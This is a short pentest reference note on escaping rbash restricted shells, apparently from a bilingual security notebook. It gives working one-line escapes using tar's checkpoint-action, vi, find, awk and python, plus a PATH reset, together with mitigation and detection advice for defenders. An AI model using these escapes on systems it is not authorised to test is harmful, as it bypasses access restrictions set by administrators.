---
topic: rbash — restricted shell escape
tags: [linux, rbash, shell-escape, gtfobins, privesc]
---

# rbash — restricted shell escape

**English** | [🌐 Español](rbash-escape.md)

## Concept

`rbash` limits commands and paths but is not a jail. Any allowed binary that can run another program, spawn a shell or write files allows escape, especially `tar`, `vi`, `less`, `find`, `awk` or `python`.

## When it applies

- The account uses `rbash` or `rksh`.
- `PATH` and available commands can be listed.
- A binary with execution functionality exists.

## Procedure

1. Identify the restriction with `echo $SHELL` and `compgen -c`.
2. Look up the binary in GTFOBins.
3. Escape with `tar`, an editor or an interpreter.
4. Fix `PATH` and get an interactive shell.

## Commands

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Variants

- `vi`: `:!/bin/bash`.
- `find . -exec /bin/bash \;`.
- `awk 'BEGIN {system("/bin/bash")}'`.
- `git` through `core.pager` or `help`.
- `python -c 'import os; os.system("/bin/bash")'`.

## Limitations

- A minimal `PATH` without useful binaries.
- `rbash` with a restricted `command_not_found_handle`.
- AppArmor/SELinux blocking `execve`.

## Mitigation

- Do not use `rbash` as a security control.
- Use real jails (namespaces, containers, SELinux).
- Restrict binaries and audit commands.

## Detection

- `tar --checkpoint-action`, `find -exec` or `vi` from restricted accounts.
- Child shells of backup processes.
- `PATH` changes after login.

## References

- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [0xdf — Chaos](https://0xdf.gitlab.io/2019/05/25/htb-chaos.html)
- [HackTricks — rbash](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)
